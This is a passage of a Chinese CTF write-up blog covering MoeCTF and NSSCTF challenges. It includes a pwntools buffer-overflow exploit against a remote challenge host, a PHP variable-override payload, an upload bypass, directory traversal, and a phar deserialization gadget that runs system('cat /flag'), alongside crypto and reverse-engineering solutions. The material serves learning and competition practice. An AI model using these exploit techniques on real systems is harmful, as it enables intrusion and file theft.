@app.route(&#x27;/callback&#x27;, methods=[&#x27;POST&#x27;])     # 回调路由
async def callback(): 
    form = dict(await request.form)
    data = (
        f&#x27;&#123;form.get(&quot;id&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;user&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;amount&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;status&quot;)&#125;&#x27;
        f&#x27;&#123;form.get(&quot;desc&quot;)&#125;&#x27;
    ).encode()
    k = pbkdf2_hmac(&#x27;sha256&#x27;, data, app.secret_key, 2**20).hex()
    tr = await Transaction.get(id=int(form.pop(&#x27;id&#x27;)))
    if k != form.get(&quot;hash&quot;):
        return &#x27;403&#x27;
    form[&#x27;status&#x27;] = TransactionStatus(int(form.pop(&#x27;status&#x27;)))
    tr.update_from_dict(form)
    await tr.save()
    return &#x27;ok&#x27;


@app.route(&#x27;/transaction&#x27;)    # 交易
async def transaction():
    if &#x27;id&#x27; not in request.args:
        return &#x27;404&#x27;
    transaction = await Transaction.get(id=request.args.get(&#x27;id&#x27;))
    return await render_template(&#x27;receipt.html&#x27;, transaction=transaction)   # 收据


@app.route(&#x27;/flag&#x27;)
async def flag():
    return await render_template(
        &#x27;flag.html&#x27;,
        balance=session[&#x27;balance&#x27;],
        flag=os.getenv(&#x27;FLAG&#x27;),
    )


@app.route(&#x27;/&#x27;)
@app.route(&#x27;/index.html&#x27;)
async def index():
    with open(__file__) as f:
        return await render_template(&#x27;source-highlight.html&#x27;, code=f.read())


register_tortoise(
    app,
    db_url=&quot;sqlite://./data.db&quot;,
    modules=&#123;&quot;models&quot;: [__name__]&#125;,
    generate_schemas=True,
)

if __name__ == &#x27;__main__&#x27;:
    app.run()</code></pre>
<h2 id="cookiehead">cookiehead</h2>
<p>基础题目，考察几个请求头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281618146.png?x-oss-process=hzy" alt="image-20220828161837065"></p>
<p>首先是本地访问,加XFF</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281619553.png?x-oss-process=hzy" alt="image-20220828161929502"></p>
<p>然后是登录，改cookie</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281619468.png?x-oss-process=hzy" alt="image-20220828161959407"></p>
<p>from地址，加referer</p>
<p>这题其实该拿一血的，但是就不知道迷瞪啥呢，我没加全，就加了127.0.0.1，后边又加了/index，最后才把全部都放上去，结果在我交flag前三秒，一血出了</p>
<p>moectf{th1s_is_http_protocolllll}</p>
<h2 id="baby_file">baby_file</h2>
<blockquote>
<p>题目描述：“海纳百川，有容乃大；壁立千仞，无欲则刚。” 寓意人要像大海能容纳无数江河水一样的胸襟宽广，以容纳和融合来对他人。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281829373.png?x-oss-process=hzy" alt="image-20220828182922293"></p>
<p>直接文件包含</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208281831693.png?x-oss-process=hzy" alt="image-20220828183106616"></p>
<pre><code class="hljs plaintext">&lt;?php
Hey hey, reach the highest city in the world! Actually I am ikun!!;

moectf&#123;Y0u_are_t00_baby_la&#125;;

?&gt;</code></pre>
<p>moectf{Y0u_are_t00_baby_la}</p>
<h2 id="ezphp">ezphp</h2>
<blockquote>
<p>题目描述：最近AQ喜欢上了一款多人在线作战游戏，但是他总是几分钟就GG了，这时他身边的h4haha说:“你一来就全面火力覆盖啊！这不就赢了吗?”</p>
</blockquote>
<pre><code class="hljs plaintext">&lt;?php

highlight_file(&#x27;source.txt&#x27;);
echo &quot;&lt;br&gt;&lt;br&gt;&quot;;

$flag = &#x27;xxxxxxxx&#x27;;
$giveme = &#x27;can can need flag!&#x27;;
$getout = &#x27;No! flag.Try again. Come on!&#x27;;
if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;
    exit($giveme);
&#125;

if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;
    exit($getout);
&#125;

foreach ($_POST as $key =&gt; $value) &#123;
    $$key = $value;
&#125;

foreach ($_GET as $key =&gt; $value) &#123;
    $$key = $$value;
&#125;

echo &#x27;the flag is : &#x27; . $flag;

?&gt;</code></pre>
<p>变量覆盖就行，post都没执行，直接全get传参</p>
<pre><code class="hljs plaintext">?513=flag&amp;flag=513</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282058364.png?x-oss-process=hzy" alt="image-20220828205855281"></p>
<p>moectf{Wa0g_Yi1g_Chu0}</p>
<h2 id="what-are-you-uploading">What are you uploading</h2>
<blockquote>
<p>题目描述：can can need 马???！</p>
</blockquote>
<p>上个der<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282232357.png?x-oss-process=hzy" alt="image-20220828223201270"></p>
<p>就是前端js绕过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282232904.png?x-oss-process=hzy" alt="image-20220828223243847"></p>
<p>所以就直接传个这个名字</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208282233735.png?x-oss-process=hzy" alt="image-20220828223310659"></p>
<p>moectf{A0_Qua1_D0ne!}</p>
<h1 id="二进制漏洞审计">二进制漏洞审计</h1>
<h2 id="二进制漏洞审计之入门指北">二进制漏洞审计之入门指北</h2>
<p>moectf{QwQ_We1com3_t0_pwn_ToT}</p>
<h2 id="shell">shell</h2>
<blockquote>
<p>题目描述：你会用 Linux 吗? 你知道什么是 Shell 吗? 题目地址：nc 43.136.137.17 3907</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262151738.png?x-oss-process=hzy" alt="image-20220826215144687"></p>
<p>moectf{W3lc0m3_t0_The_Pwn_W0r1d}</p>
<h2 id="int_overflow">int_overflow</h2>
<blockquote>
<p>题目描述：来做小学数学题! 题目地址： nc 43.136.137.17 3908</p>
</blockquote>
<p>看题目名字，那应该就是考察的整数溢出</p>
<p>看下功能<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271143911.png?x-oss-process=hzy" alt="image-20220827114350835"></p>
<p>就是一个算数，giao，显然是个不可能回答正确的问题</p>
<p>check一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271146142.png?x-oss-process=hzy" alt="image-20220827114605093"></p>
<p>ida看主体逻辑</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271146202.png?x-oss-process=hzy" alt="image-20220827114657137"></p>
<p>我看到了/bin/sh，哦吼吼，同时可以看到他的这个问题的数字都是随机生成的，问题不大，只要correctt了，就会执行system</p>
<h2 id="ret2text">ret2text</h2>
<p>checksec  64位</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201428470.png?x-oss-process=hzy" alt="image-20220920142837389"></p>
<p>main函数如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201430612.png?x-oss-process=hzy" alt="image-20220920143013539"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201430593.png?x-oss-process=hzy" alt="image-20220920143049521"></p>
<p>shell地址是0x14BA，exp如下</p>
<pre><code class="hljs plaintext">from pwn import *

#p=process(&#x27;./pwn&#x27;)
p=remote(&#x27;124.223.158.81&#x27;,27002)
payload = b&#x27;a&#x27;*72 + p64(0x4014C2)  
p.sendline(payload)
p.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209201431376.png?x-oss-process=hzy" alt="image-20220920143150318"></p>
<p>moectf{h3y_y0u_kn0w_wh47_15_574ck_0v32_f10w}</p>
<h1 id="现代密码学">现代密码学</h1>
<h2 id="密码学之入门指北">密码学之入门指北</h2>
<p>题目如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271129258.png?x-oss-process=hzy" alt="image-20220827112953173"></p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext"># solution1 for ex1
from Crypto.Util.number import long_to_bytes,inverse

def dec(c):#不用搜索！解一个二元方程组即可
    a=inverse((ord(&#x27;c&#x27;)-ord(&#x27;t&#x27;)),256)*(c[3]-c[4])%256
    b=(c[0]-ord(&#x27;m&#x27;)*a)%256
    print(&quot;a=&quot;,a,&quot;b=&quot;,b)
    print(bytes(list(map(lambda x:(x-b)*inverse(a,256)%256,c))))
    return
    
c=long_to_bytes(23904604480218951222924468885892706253385766083586197703800132687872601727899557854623831975886365472122)

dec(c)  // a= 13 b= 33  b&#x27;moectf&#123;Welc0me_t0_fascinating_crypto_w0rld&#125;&#x27;</code></pre>
<p>moectf{Welc0me_t0_fascinating_crypto_w0rld}</p>
<h2 id="0rsa0">0rsa0</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from flag import flag

assert flag[0:7] == b&#x27;moectf&#123;&#x27;
assert flag[-1:] == b&#x27;&#125;&#x27;
flag = flag[7:-1]
assert len(flag) == 32

m1 = bytes_to_long(flag[0:16])
m2 = bytes_to_long(flag[16:32])

def enc1(m):
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    e = 3
    c = pow(m,e,n)
    return n,e,c

def enc2(m):
    p = getPrime(512)
    q = getPrime(512)
    e = 65537
    d = inverse(e,(p-1)*(q-1))
    n = p * q 
    dp2 = d % (p-1)
    c = pow(m,e,n)
    return n,e,c,dp2

n1,e1,c1 = enc1(m1)
n2,e2,c2,dp2 = enc2(m2)

print(&quot;n1=&quot;+ str(n1))
print(&quot;e1=&quot;+ str(e1))
print(&quot;c1=&quot;+ str(c1))
print(&quot;n2=&quot;+ str(n2))
print(&quot;e2=&quot;+ str(e2))
print(&quot;c2=&quot;+ str(c2))
print(&quot;dp2=&quot;+ str(dp2))

&#x27;&#x27;&#x27;
n1=133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707
e1=3
c1=1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n2=159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729
e2=65537
c2=37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306
dp2=947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865
&#x27;&#x27;&#x27;</code></pre>
<p>这是两道rsa题目，第一道是给了n，c，e，小e低指数攻击，先分解n成俩大素数</p>
<pre><code class="hljs plaintext">import gmpy2
import libnum

def de(c, e, n):
    k = 0
    while True:
        mm = c + n*k
        result, flag = gmpy2.iroot(mm, e)
        if True == flag:
            return result
        k += 1
e= 3
c = 1402983421957507617092580232325850324755110618998641078304840725502785669308938910491971922889485661674385555242824
n = 133024413746207623787624696996450696028790885302997888417950218110624599333002677651319135333439059708696691802077223829846594660086912881559705074934655646133379015018208216486164888406398123943796359972475427652972055533125099746441089220943904185289464863994194089394637271086436301059396682856176212902707

m=de(c,e,n)
print(m)
print(libnum.n2s(int(m)).decode())

//111948302617335386234579104898884924274
//T8uus_23jkjw_asr
</code></pre>
<p>第二道rsa的e就不小了，dp泄露</p>
<pre><code class="hljs plaintext">import gmpy2 as gp

e = 65537
n = gp.mpz(159054389158529397912052248500898471690131016887756654738868415880711791524038820158051782236121110394481656324333254185994103242391825337525378467922406901521793714621471618374673206963439266173586955520902823718942484039624752828390110673871132116507696336326760564857012559508160068814801483975094383392729)
dp = gp.mpz(947639117873589776036311153850942192190143164329999603361788468962756751774397111913170053010412835033030478855001898886178148944512883446156861610917865)

c = gp.mpz(37819867277367678387219893740454448327093874982803387661058084123080177731002392119369718466140559855145584144511271801362374042596420131167791821955469392938900319510220897100118141494412797730438963434604351102878410868789119825127662728307578251855605147607595591813395984880381435422467527232180612935306)
for x in range(1, e):
    if(e*dp%x==1):
        p=(e*dp-1)//x+1
        if(n%p!=0):
            continue
        q=n//p
        phin=(p-1)*(q-1)
        d=gp.invert(e, phin)
        m=gp.powmod(c, d, n)
        if(len(hex(m)[2:])%2==1):
            continue
        print(&#x27;--------------&#x27;)
        print(m)
        print(hex(m)[2:])
        print(bytes.fromhex(hex(m)[2:]))
//126543499036541017633689010451217675108
5f336433326177642135662623407364
//b&#x27;_3d32awd!5f&amp;#@sd&#x27;</code></pre>
<p>moectf{T8uus_23jkjw_asr_3d32awd!5f&amp;#@sd}</p>
<h2 id="一次就好">一次就好</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.strxor import strxor
from Crypto.Util.number import *
from gmpy2 import powmod,next_prime
from FLAG import flag
import codecs

c = b&#x27;Just once,I will accompany you to see the world&#x27;
flag = flag.ljust(len(c),&#x27;#&#x27;)
key = strxor(flag.encode(), c)
m = bytes_to_long(key)

p = getPrime(512)
q = next_prime(p)
N = p*q
e = 0x10001

gift = powmod(m, e, N)

print(gift)
print(N)

# gift = 127749242340004016446001520961422059381052911692861305057396462507126566256652316418648339729479729456613704261614569202080544183416817827900318057127539938899577580150210279291202882125162360563285794285643498788533366420857232908632854569967831654923280152015070999912426044356353393293132914925252494215314
# N = 164395171965189899201846744244839588935095288852148507114700855000512464673975991783671493756953831066569435489213778701866548078207835105414442567008315975881952023037557292470005621852113709605286462434049311321175270134326956812936961821511753256992797013020030263567313257339785161436188882721736453384403

</code></pre>
<p>gift是c，知道n，c，e=65537，啊不对，不是c，不会</p>
<h1 id="软件逆向工程">软件逆向工程</h1>
<h2 id="check-in">check in</h2>
<blockquote>
<p>题目描述：这是一道非常简单的签到题，借助IDA可以很快capture the flag~ 如果你不知道IDA是什么，可以借助搜索引擎来学习。群文件中有IDA，关于IDA使用可以看https://www.bilibili.com/video/BV1F54y1h7BS?p=4&amp;share_source=copy_web（从15分钟开始看）</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262153047.png?x-oss-process=hzy" alt="image-20220826215346987"></p>
<p>moectf{Enjoy_yourself_in_Reverse_Engineering!!!}</p>
<h2 id="hex">Hex</h2>
<blockquote>
<p>题目描述：查看文件16进制内容的工具:Notepad++,WinHex,010(推荐)</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262156965.png?x-oss-process=hzy" alt="image-20220826215604920"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262158333.png?x-oss-process=hzy" alt="image-20220826215820286"></p>
<p>moectf{Hello_Hex}</p>
<h2 id="逆向工程之入门指北">逆向工程之入门指北</h2>
<blockquote>
<p>题目描述：开始你的逆向工程之旅吧～</p>
</blockquote>
<p>moectf{0hhhhhhh_I_kn0w_hoW_t0_R3v3rs3!}</p>
<h2 id="begin">begin</h2>
<blockquote>
<p>题目描述：xor，异或，是一种神奇的运算。当用异或对一段数据进行加密，怎样才能将密文恢复成明文呢？ 搜索引擎会告诉你答案~加油吧</p>
</blockquote>
<p>主体逻辑如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208302231541.png?x-oss-process=hzy" alt="image-20220830223143390"></p>
<p>就是输入一个值进行异或加密之后和s2进行对照，然后一样就会输出good</p>
<p>说明flag就是s2，跟进提取逆向输出得到flag</p>
<pre><code class="hljs plaintext">s2 = [ 0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B, 
  0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D, 
  0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38, 
  0x38, 0x38, 0x38, 0x64, 0x00]
flag = &#x27;&#x27;
for i in range(len(s2)):
    flag += chr(s2[i]^25)
print(flag)</code></pre>
<p>moectf{X0r_1s_s0_int3r3sting!!!}</p>
<h2 id="base">Base</h2>
<blockquote>
<p>题目描述：base64可以将ascii表中无法显示的数转化为可以显示的数，进而方便在网络中进行传输qwq（建议百度查找一下原理）不过这个base有一点不一样哦</p>
</blockquote>
<p>初步看描述猜到应该就是base64解码，只是码表需要换一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208311225360.png?x-oss-process=hzy" alt="image-20220831122530437"></p>
<p>密文1wX/yRrA4RfR2wj72Qv52x3L5qa=</p>
<p>码表是abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>
<p>网上找个脚本，跑一下就出了</p>
<pre><code class="hljs plaintext"># coding:utf-8
 
#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
#s = &quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;
s = &quot;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
 
def My_base64_encode(inputs):
   # 将字符串转化为2进制
   bin_str = []
   for i in inputs:
      x = str(bin(ord(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)
      bin_str.append(&#x27;&#123;:0&gt;8&#125;&#x27;.format(x))
   #print(bin_str)
   # 输出的字符串
   outputs = &quot;&quot;
   # 不够三倍数，需补齐的次数
   nums = 0
   while bin_str:
      #每次取三个字符的二进制
      temp_list = bin_str[:3]
      if(len(temp_list) != 3):
         nums = 3 - len(temp_list)
         while len(temp_list) &lt; 3:
            temp_list += [&#x27;0&#x27; * 8]
      temp_str = &quot;&quot;.join(temp_list)
      #print(temp_str)
      # 将三个8字节的二进制转换为4个十进制
      temp_str_list = []
      for i in range(0,4):
         temp_str_list.append(int(temp_str[i*6:(i+1)*6],2))
      #print(temp_str_list)
      if nums:
         temp_str_list = temp_str_list[0:4 - nums]
         
      for i in temp_str_list:
         outputs += s[i]
      bin_str = bin_str[3:]
   outputs += nums * &#x27;=&#x27;
   print(&quot;Encrypted String:\n%s &quot;%outputs)
   
def My_base64_decode(inputs):
   # 将字符串转化为2进制
   bin_str = []
   for i in inputs:
      if i != &#x27;=&#x27;:
         x = str(bin(s.index(i))).replace(&#x27;0b&#x27;, &#x27;&#x27;)
         bin_str.append(&#x27;&#123;:0&gt;6&#125;&#x27;.format(x))
   #print(bin_str)
   # 输出的字符串
   outputs = &quot;&quot;
   nums = inputs.count(&#x27;=&#x27;)
   while bin_str:
      temp_list = bin_str[:4]
      temp_str = &quot;&quot;.join(temp_list)
      #print(temp_str)
      # 补足8位字节
      if(len(temp_str) % 8 != 0):
         temp_str = temp_str[0:-1 * nums * 2]
      # 将四个6字节的二进制转换为三个字符
      for i in range(0,int(len(temp_str) / 8)):
         outputs += chr(int(temp_str[i*8:(i+1)*8],2))
      bin_str = bin_str[4:]	
   print(&quot;Decrypted String:\n%s &quot;%outputs)
   
print()
print(&quot;     *************************************&quot;)
print(&quot;     *    (1)encode         (2)decode    *&quot;)   
print(&quot;     *************************************&quot;)
print()
 
 
num = input(&quot;Please select the operation you want to perform:\n&quot;)
if(num == &quot;1&quot;):
   input_str = input(&quot;Please enter a string that needs to be encrypted: \n&quot;)
   My_base64_encode(input_str)
else:
   input_str = input(&quot;Please enter a string that needs to be decrypted: \n&quot;)
   My_base64_decode(input_str)</code></pre>
<p>moectf{qwqbase_qwq}</p>
<h1 id="隐写等杂项">隐写等杂项</h1>
<h2 id="hide-and-seek">Hide-and-seek</h2>
<blockquote>
<p>题目描述：诶？是谁捉迷藏还把脚露出来啦。</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262201044.png?x-oss-process=hzy" alt="image-20220826220115924"></p>
<p>直接复制</p>
<p>moectf{Hey_U_ve_f0und_m3!}</p>
<h2 id="misc杂项之入门指北">Misc杂项之入门指北</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262202504.png?x-oss-process=hzy" alt="image-20220826220215458"></p>
<pre><code class="hljs plaintext">.-- . .-.. ..--- --- -- . ..--.- ....- --- ..--.- -- .. ...-- -.-. ..--.- .---- ..- -.-. -.- -.-- -.-.--</code></pre>
<p>摩斯解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262203062.png?x-oss-process=hzy" alt="image-20220826220259993"></p>
<p>moectf{WEL2OME_4O_MI3C_1UCKY!}</p>
<h2 id="rabbit">Rabbit</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262204893.png?x-oss-process=hzy" alt="image-20220826220456846"></p>
<p>base64解密,好吧翻车了，不是base64解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262207232.png?x-oss-process=hzy" alt="image-20220826220732161"></p>
<p>rabbit解密</p>
<p>moectf{We1c0m3_t0_moectf_an7_3n7oy_y0urse1f}</p>
<h2 id="小纸条">小纸条</h2>
<blockquote>
<p>题目描述：由于疫情无法回家的小明，正瘫坐在椅子，给你扔来了一张纸条，然后忧愁地望向窗外…  他怎么想什么呢？<br>
提示：<br>
&lt;0&gt; 全部大写，无分隔</p>
</blockquote>
<h2 id="寻找黑客的家">寻找黑客的家</h2>
<blockquote>
<p>题目描述：大黑客Mikato期末结束就迫不及待的回了家，并在朋友圈发出了“这次我最早”的感叹。那么你能从这条朋友圈找到他的位置吗？</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272035947.png?x-oss-process=hzy" alt="附件1"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272036838.jpeg?x-oss-process=hzy" alt="附件2"></p>
<p>题目就是给这俩图，找地方</p>
<blockquote>
<p>大黑阔Mikato期末结束就迫不及待的回了家，并在朋友圈发出了“这次我最早”的感叹。那么你能从这条朋友圈找到他的位置吗？</p>
<p>moectf{照片拍摄地市名区名路名} (字母均小写)<br>
例如：西安市长安区西沣路：moectf{xian_changan_xifeng}</p>
</blockquote>
<p>找找找，找呀找，然后是广东省深圳市龙华区清泉路</p>
<p>moectf{shenzhen_longhua_qingquan}</p>
<h2 id="nyanyanya">Nyanyanya!</h2>
<blockquote>
<p>题目描述：图片隐写先看看哪里呢？</p>
</blockquote>
<p>LSB解密</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262215229.png?x-oss-process=hzy" alt="image-20220826221543179"></p>
<p>moectf{A_go0d_way_t0_h14e_in50rmation_in_ima9e3}</p>
<h2 id="what-do-you-recognize-me-by">What do you recognize me by?</h2>
<blockquote>
<p>题目描述：你还认识我是谁吗？</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262218050.png?x-oss-process=hzy" alt="image-20220826221851979"></p>
<p>文件头修复一下，png文件头</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262219255.png?x-oss-process=hzy" alt="image-20220826221912209"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262220964.png?x-oss-process=hzy" alt="image-20220826222032907"></p>
<p>moectf{You_r4c0gnize_%e!}</p>
<h2 id="想听点啥">想听点啥？</h2>
<blockquote>
<p>题目描述：听见啥了？还是看见啥了？</p>
</blockquote>
<h2 id="locked-bass">Locked bass</h2>
<blockquote>
<p>题目描述：你想玩贝斯？这锁虚挂着的，能踹</p>
</blockquote>
<p>附件是个压缩包，需要输密码，但是第一直觉告诉我是伪加密，但是尝试了winrar自带的修复工具没成功，后来尝试用ZipCenOp，修复成功，工具地址：<a href="https://didctf.lanzouw.com/ijVki09eh7sb">https://didctf.lanzouw.com/ijVki09eh7sb</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271434068.png?x-oss-process=hzy" alt="image-20220827143457991"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271435041.png?x-oss-process=hzy" alt="image-20220827143513975"></p>
<p>moectf{N0w_th1s_i4_a_b@ss_U_can_u3e_to_pla9}</p>
<h2 id="a-band">A band</h2>
<blockquote>
<p>题目描述：我只知道机器只能听懂这种乐队演奏，一层一层还原，或许有你想要的</p>
</blockquote>
<p>首先附件全是二进制</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272121537.png?x-oss-process=hzy" alt="image-20220827212142439"></p>
<p>先转str</p>
<p><a href="https://coding.tools/cn/binary-to-text">2进制到ASCII字符串在线转换工具 - Coding.Tools</a></p>
<p>再转str</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272122419.png?x-oss-process=hzy" alt="image-20220827212228348"></p>
<p>再AAEncode解密</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=703">AAEncode加密/解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272122869.png?x-oss-process=hzy" alt="image-20220827212253786"></p>
<pre><code class="hljs plaintext">This_is_a_small_bass_KRUGS427MJQXG427ONSWK3LTL52G6X3CMVPWI2LGMZSXEZLOORPWM4TPNVPXI2DFL5YHEZLWNFXXK427N5XGKXZXGI3EEND2GRKHQRSBMJSHI5SWIF2WM2LQMJWVCS2FMVCUIYLHOB4WOQ3YNVYE2RLDME4EMWBRNY3VIMTSKBBG2TBZOVLEE6DTJJJVOQTVGZBHEYTEKY4EQWLPIJDVQY3PGJUFKQSMKBGUKZDWPJJTSYLXK43EOWLBKA2XANDDLA3FEMSXKA4GWYY=;</code></pre>
<p>然后就是base套娃，三次不同的base得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272123510.png?x-oss-process=hzy" alt="image-20220827212330450"></p>
<p>moectf{Why_s0_many_1nstruments?}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF</title>
    <url>/2022/08/03/NSSCTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031847359.png?x-oss-process=hzy" alt="44fa6dabcc"></p>
<span id="more"></span>
<h1 id="web">web</h1>
<h2 id="1zweb">1zweb</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031010677.png?x-oss-process=hzy" alt="image-20220803101042557"></p>
<p>上传题？尝试一下文件读取</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011786.png?x-oss-process=hzy" alt="image-20220803101113721"></p>
<p>目录穿越呢？</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011952.png?x-oss-process=hzy" alt="image-20220803101126893"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031011322.png?x-oss-process=hzy" alt="image-20220803101136271"></p>
<p>NSSCTF{c2121501-15be-4f89-a68d-ac3a3a21c33d}</p>
<h2 id="ez_rce">ez_rce</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031036517.png?x-oss-process=hzy" alt="image-20220803103635455"></p>
<p>中间件漏洞</p>
<p><a href="https://blog.csdn.net/weixin_40412037/article/details/120777496">(50条消息) Apahce HTTPd 2.4.49（CVE-2021-41773）漏洞复现详细教程_W小哥1的博客-CSDN博客_apusic漏洞</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031042179.png?x-oss-process=hzy" alt="image-20220803104224098"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208031042449.png?x-oss-process=hzy" alt="image-20220803104238375"></p>
<p>NSSCTF{60150876-f52f-426a-b1aa-8be494823ece}</p>
<h2 id="1zwebrevenge">1zweb(revenge)</h2>
<p>升级版，再那样读取回显nonono</p>
<p>考察phar反序列化</p>
<pre><code class="hljs plaintext">&lt;?php
class LoveNss&#123;
    public $ljt;
    public $dky;
    public $cmd;
    public function __construct()&#123;
        $this-&gt;ljt=&quot;Misc&quot;;
        $this-&gt;dky=&quot;Re&quot;;
        $this-&gt;cmd=&#x27;system(&quot;cat /flag&quot;);&#x27;;
        
    &#125;
    public function __destruct()&#123;
        if($this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;)
            eval($this-&gt;cmd);
    &#125;
    public function __wakeup()&#123;
        $this-&gt;ljt=&quot;Re&quot;;
        $this-&gt;dky=&quot;Misc&quot;;
    &#125;
&#125;
$poc=new LoveNss();
$phar = new Phar(&#x27;1.phar&#x27;);
$phar -&gt; startBuffering();       
$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);  
$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);    
$phar -&gt; setMetadata($poc);    
$phar -&gt; stopBuffering();</code></pre>
